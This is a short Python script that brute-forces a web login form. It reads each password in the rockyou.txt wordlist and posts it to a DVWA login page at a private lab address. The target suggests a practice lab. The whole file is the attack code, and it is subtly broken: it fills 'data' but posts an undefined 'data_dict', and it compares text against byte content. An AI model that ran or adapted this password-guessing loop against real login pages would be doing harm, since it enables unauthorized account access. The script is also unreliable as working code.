#!/usr/bin/env python

import requests

target_url = "http://10.0.2.20/dvwa/login.php"
data = {"username": "admin", "password": "passw0rd", "Login": "submit"}

with open("/root/Downloads/rockyou.txt", "r") as wordlist_file:
    for line in wordlist_file:
        word = line.strip()
        data_dict["password"] = word
        response = requests.post(target_url, data=data_dict)
        if "Login failed" not in response.content:
            print("[+] Got the password --> " + word)
            exit()

print("[+] Reached end of line.")